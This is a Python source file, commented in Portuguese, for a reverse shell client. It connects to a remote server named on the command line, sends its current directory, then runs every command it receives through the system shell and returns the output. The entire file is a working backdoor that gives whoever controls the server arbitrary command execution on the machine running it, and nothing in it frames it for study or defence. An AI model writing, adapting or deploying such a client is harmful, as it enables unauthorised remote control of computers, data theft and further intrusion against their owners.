import socket
import os
import subprocess
import sys

SERVER_HOST = sys.argv[1]
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128 # tamanho maximo de mensagens que pode ser almentado
# separador para envio de 2 mensagens de uma vez
SEPARATOR = "<sep>"

# criar um objeto socket
s = socket.socket()
# conctar ao servidor
s.connect((SERVER_HOST, SERVER_PORT))

# resgatar diretorio atual
cwd = os.getcwd()
s.send(cwd.encode())

# loop principal - recebe comando do servidor, executa e retorna o resultado
while True:
    # receber comando do servidor
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == 'exit':
        # se o comando for exit, saira do loop
        break
    if splited_command[0].lower() == 'cd':
        # cd, comando para mudar de diretorio
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            # se houver erro, mostrar output
            output = str(e)
        else:
            # se a operacao for bem sucedida, esvaziar mensagem
            output = ''
    else:
        # executar comando e retornar o resultado
        output = subprocess.getoutput(command)
    # obter diretorio atual como output
    cwd = os.getcwd()
    # enviar resultado ao servidor
    message = (f'{output}{SEPARATOR}{cwd}')
    s.send(message.encode())
# encerrar conexao com o cliente
s.close()